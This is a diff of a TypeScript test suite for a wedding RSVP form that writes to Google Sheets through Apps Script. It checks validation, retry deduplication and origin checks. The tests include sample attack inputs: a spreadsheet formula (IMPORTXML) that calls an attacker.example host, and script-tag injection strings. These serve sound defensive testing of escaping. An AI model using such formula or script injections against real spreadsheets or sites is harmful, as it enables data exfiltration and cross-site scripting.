@@ -1,21 +1,24 @@
-import { afterEach, beforeEach, describe, expect, spyOn, test } from "bun:test";
+import { beforeEach, describe, expect, test } from "bun:test";
 import { readFileSync } from "node:fs";
 import { runInNewContext } from "node:vm";
-import { onRequest } from "../../functions/api/rsvp";
 
 const script = readFileSync(new URL("../../apps-script/Code.gs", import.meta.url), "utf8");
-const env = {
-  RSVP_SCRIPT_URL: "https://script.google.com/macros/s/test-deployment/exec",
-  RSVP_API_TOKEN: "synthetic-test-token-not-a-real-secret",
-};
+const origin = "https://invitation.example";
+const nonce = "3cdbd701-b730-4963-a468-40e7bddfc32e";
 const valid = {
   requestId: "d0da906d-8fb7-4c37-8f51-dd5bcb5aa770",
   name: " Nguyễn An ", attendance: "attending", count: 2,
   note: " Hẹn gặp hai bạn! ", website: "",
 };
+interface Receipt {
+  type: string;
+  nonce: string;
+  ok: boolean;
+  requestId?: string;
+  error?: string;
+}
 
-// Execute the deployable Apps Script, mocking only Google's host services.
-// This tests our protocol/storage behavior, not the real Google service.
+// Run the deployable script and its HTML receipt, mocking only Google services.
 function googleHarness() {
   const rows: unknown[][] = [];
   let locked = false;
@@ -61,7 +64,6 @@ function googleHarness() {
   };
   let exists = false;
   const runtime = runInNewContext(script + "\n({ doPost })", {
-    PropertiesService: { getScriptProperties: () => ({ getProperty: () => env.RSVP_API_TOKEN }) },
     LockService: { getScriptLock: () => lock },
     SpreadsheetApp: {
       openById(id: string) {
@@ -73,168 +75,105 @@ function googleHarness() {
       },
       flush() { if (failFlush) throw new Error("private account failure"); },
     },
-    ContentService: {
-      MimeType: { JSON: "application/json" },
-      createTextOutput: (body: string) => ({ setMimeType: () => body }),
+    HtmlService: {
+      XFrameOptionsMode: { ALLOWALL: "ALLOWALL" },
+      createHtmlOutput: (body: string) => ({
+        getContent: () => body,
+        setXFrameOptionsMode(mode: string) { expect(mode).toBe("ALLOWALL"); return this; },
+      }),
     },
-  }) as { doPost(event: { postData: { contents: string } }): string };
+  }) as { doPost(event: { parameter: Record<string, string> }): { getContent(): string } };
   return {
     rows,
     get locked() { return locked; },
     set busy(value: boolean) { busy = value; },
     set failFlush(value: boolean) { failFlush = value; },
-    post(body: string) { return runtime.doPost({ postData: { contents: body } }); },
+    html(payload: unknown, fields: Record<string, string> = {}) {
+      return runtime.doPost({ parameter: {
+        payload: typeof payload === "string" ? payload : JSON.stringify(payload),
+        nonce, origin, ...fields,
+      } }).getContent();
+    },
+    post(payload: unknown = valid): Receipt {
+      const html = this.html(payload);
+      let receipt: Receipt | undefined;
+      runInNewContext(html.replace(/^<script>|<\/script>$/g, ""), {
+        window: { top: { postMessage(value: Receipt, target: string) {
+          expect(target).toBe(origin);
+          receipt = value;
+        } } },
+      });
+      if (!receipt) throw new Error("Missing acknowledgement");
+      return receipt;
+    },
   };
 }
 
-describe("RSVP → Apps Script protocol", () => {
+describe("Direct RSVP → Google Apps Script", () => {
   let google: ReturnType<typeof googleHarness>;
-  let upstream: ReturnType<typeof spyOn<typeof globalThis, "fetch">>;
-  beforeEach(() => {
-    google = googleHarness();
-    upstream = spyOn(globalThis, "fetch").mockImplementation(async (_url, init) =>
-      new Response(google.post(String(init?.body)), { headers: { "Content-Type": "application/json" } }));
-  });
-  afterEach(() => upstream.mockRestore());
+  beforeEach(() => { google = googleHarness(); });
 
-  function send(body: unknown = valid, headers: Record<string, string> = {}, config = env) {
-    return onRequest({
-      request: new Request("https://invitation.example/api/rsvp", {
-        method: "POST", headers: { "Content-Type": "application/json", ...headers },
-        body: typeof body === "string" ? body : JSON.stringify(body),
-      }),
-      env: config,
-    });
-  }
-
-  test("saves trimmed Unicode data, keeps token server-side, and waits for acknowledgement", async () => {
-    const response = await send(valid, { Origin: "https://invitation.example" });
-    expect(response.status).toBe(200);
-    expect(await response.json()).toEqual({ ok: true, requestId: valid.requestId });
-    expect(response.headers.get("Cache-Control")).toBe("no-store");
+  test("saves Unicode data without a token and returns only a matching receipt", () => {
+    expect(google.post()).toEqual({ type: "wedding-rsvp", nonce, ok: true, requestId: valid.requestId });
     expect(google.rows[1]?.slice(2, 6)).toEqual(["Nguyễn An", "attending", 2, "Hẹn gặp hai bạn!"]);
-    expect(upstream.mock.calls[0]?.[0]).toBe(env.RSVP_SCRIPT_URL);
-    expect(upstream.mock.calls[0]?.[1]?.redirect).toBe("follow");
     expect(google.locked).toBe(false);
   });
 
-  test("exact retries reuse one row; changed data conflicts without overwrite", async () => {
-    for (let i = 0; i < 3; i++) expect((await send()).status).toBe(200);
-    expect((await send({ ...valid, requestId: valid.requestId.toUpperCase() })).status).toBe(200);
-    expect((await send({ ...valid, count: 3 })).status).toBe(409);
+  test("retries after a lost receipt reuse the row; changed data cannot overwrite it", () => {
+    google.html(valid); // Saved, but the browser never received this receipt.
+    for (let i = 0; i < 3; i++) expect(google.post().ok).toBe(true);
+    expect(google.post({ ...valid, requestId: valid.requestId.toUpperCase() }).ok).toBe(true);
+    expect(google.post({ ...valid, count: 3 }).error).toBe("idempotency_conflict");
     expect(google.rows).toHaveLength(2);
     expect(google.rows[1]?.[4]).toBe(2);
   });
 
-  test("lost acknowledgement can retry safely after a completed write", async () => {
-    upstream.mockImplementationOnce(async (_url, init) => {
-      google.post(String(init?.body));
-      throw new Error("response lost after saving");
-    });
-    expect((await send()).status).toBe(503);
-    expect((await send()).status).toBe(200);
-    expect(google.rows).toHaveLength(2);
+  test("accepts absent/default fields and maximum lengths", () => {
+    expect(google.post({ ...valid, attendance: "absent", count: 10, name: "n".repeat(80), note: "x".repeat(400) }).ok).toBe(true);
+    expect(google.post({ ...valid, requestId: crypto.randomUUID(), note: undefined, website: undefined }).ok).toBe(true);
   });
 
-  test("absent/default fields and maximum lengths remain valid", async () => {
-    expect((await send({ ...valid, attendance: "absent", count: 10, name: "n".repeat(80), note: "x".repeat(400) })).status).toBe(200);
-    expect((await send({ ...valid, requestId: crypto.randomUUID(), note: undefined, website: undefined })).status).toBe(200);
-  });
-
-  test("guest formulas are escaped, while repeated input still deduplicates", async () => {
-    const body = { ...valid, name: '=IMPORTXML("https://attacker.example", "//a")', note: "+dangerous" };
-    expect((await send(body)).status).toBe(200);
-    expect((await send(body)).status).toBe(200);
+  test("escapes spreadsheet formulas and never includes guest HTML in the receipt", () => {
+    const body = { ...valid, name: '=IMPORTXML("https://attacker.example", "//a")', note: "</script><script>alert(1)</script>" };
+    expect(google.post(body).ok).toBe(true);
+    expect(google.html(body)).not.toContain(body.note);
     expect(google.rows[1]?.[2]).toBe("'" + body.name);
-    expect(google.rows[1]?.[5]).toBe("'" + body.note);
-    expect(google.rows).toHaveLength(2);
+    expect(google.rows[1]?.[5]).toBe(body.note);
+    expect(google.post({ ...valid, requestId: crypto.randomUUID(), note: "+formula" }).ok).toBe(true);
+    expect(google.rows[2]?.[5]).toBe("'+formula");
   });
 
   test.each([
     { requestId: "invalid" }, { name: " " }, { name: 1 }, { name: "n".repeat(81) },
     { note: "n".repeat(401) }, { attendance: "yes" }, { count: 0 }, { count: 11 },
     { count: 1.5 }, { count: "2" }, { website: "spam" }, { website: 123 },
-  ])("rejects invalid input before calling Google: %j", async (fields) => {
-    expect((await send({ ...valid, ...fields })).status).toBe(400);
-    expect(upstream).not.toHaveBeenCalled();
-  });
-
-  test("rejects malformed JSON, oversized bytes, foreign origins, and wrong media type", async () => {
-    for (const body of ["{broken", "null", "[]", "true"]) expect((await send(body)).status).toBe(400);
-    expect((await send(JSON.stringify({ ...valid, padding: "界".repeat(3000) }), { "Content-Length": "1" })).status).toBe(413);
-    expect((await send(valid, { Origin: "https://attacker.example" })).status).toBe(403);
-    expect((await send(valid, { "Content-Type": "text/plain" })).status).toBe(415);
-    expect(upstream).not.toHaveBeenCalled();
-  });
-
-  test("only POST is allowed", async () => {
-    for (const method of ["GET", "PUT", "DELETE", "OPTIONS"]) {
-      const response = await onRequest({ request: new Request("https://invitation.example/api/rsvp", { method }), env });
-      expect(response.status).toBe(405);
-      expect(response.headers.get("Allow")).toBe("POST");
-    }
-    expect(upstream).not.toHaveBeenCalled();
-  });
-
-  test("missing/unsafe configuration cannot send the token to an arbitrary URL", async () => {
-    for (const config of [
-      { ...env, RSVP_API_TOKEN: "" }, { ...env, RSVP_API_TOKEN: "short" },
-      { ...env, RSVP_SCRIPT_URL: "" }, { ...env, RSVP_SCRIPT_URL: "https://attacker.example/exec" },
-      { ...env, RSVP_SCRIPT_URL: "https://script.google.com/macros/s/test/dev" },
-    ]) expect((await send(valid, {}, config)).status).toBe(503);
-    expect(upstream).not.toHaveBeenCalled();
-  });
-
-  test("Google login HTML, failures, or mismatched acknowledgements cannot report success", async () => {
-    for (const response of [
-      new Response("Google account required"), new Response("failure", { status: 500 }),
-      Response.json({ ok: true }), Response.json({ ok: true, requestId: crypto.randomUUID() }),
-      Response.json({ ok: false, error: "unauthorized", token: "private upstream details" }),
-    ]) {
-      upstream.mockResolvedValueOnce(response);
-      const result = await send();
-      expect(result.status).toBe(503);
-      expect(await result.json()).toEqual({ ok: false, error: "service_unavailable" });
-    }
-  });
-
-  test("Apps Script independently authenticates and validates before accessing Sheets", () => {
-    for (const body of [
-      { token: "wrong", submission: valid },
-      { token: env.RSVP_API_TOKEN, submission: { ...valid, count: 0 } },
-      { token: env.RSVP_API_TOKEN, submission: null },
-    ]) expect(JSON.parse(google.post(JSON.stringify(body))).ok).toBe(false);
+  ])("rejects invalid submissions before opening the spreadsheet: %j", (fields) => {
+    expect(google.post({ ...valid, ...fields }).error).toBe("invalid_request");
     expect(google.rows).toHaveLength(0);
   });
 
-  test("lock contention, flush failure and unexpected headers fail safely", async () => {
+  test("rejects malformed/oversized payloads and unsafe receipt parameters", () => {
+    for (const payload of ["{broken", "null", "[]", "true", "x".repeat(16385)]) {
+      expect(google.post(payload).ok).toBe(false);
+    }
+    for (const fields of [{ nonce: "invalid" }, { origin: "*" }, { origin: 'https://site.example/</script>' }]) {
+      expect(google.html(valid, fields)).toBe("Invalid request");
+    }
+    expect(google.rows).toHaveLength(0);
+  });
+
+  test("lock contention, flush failure and unexpected headers cannot acknowledge success", () => {
     google.busy = true;
-    expect((await send()).status).toBe(503);
+    expect(google.post().error).toBe("service_unavailable");
     expect(google.rows).toHaveLength(0);
     google.busy = false;
     google.failFlush = true;
-    expect((await send()).status).toBe(503);
+    expect(google.post().error).toBe("service_unavailable");
     expect(google.locked).toBe(false);
     google.failFlush = false;
-    expect((await send()).status).toBe(200);
+    expect(google.post().ok).toBe(true);
     google.rows[0]![0] = "User's existing unrelated data";
-    expect((await send({ ...valid, requestId: crypto.randomUUID() })).status).toBe(503);
+    expect(google.post({ ...valid, requestId: crypto.randomUUID() }).error).toBe("service_unavailable");
     expect(google.rows).toHaveLength(2);
-  });
-
-  test("pending Google response cannot resolve the form request as saved", async () => {
-    let release!: () => void;
-    const gate = new Promise<void>((resolve) => { release = resolve; });
-    upstream.mockImplementationOnce(async (_url, init) => {
-      await gate;
-      return new Response(google.post(String(init?.body)));
-    });
-    let resolved = false;
-    const pending = send().then((response) => { resolved = true; return response; });
-    await Bun.sleep(10);
-    expect(resolved).toBe(false);
-    expect(google.rows).toHaveLength(0);
-    release();
-    expect((await pending).status).toBe(200);
   });
 });
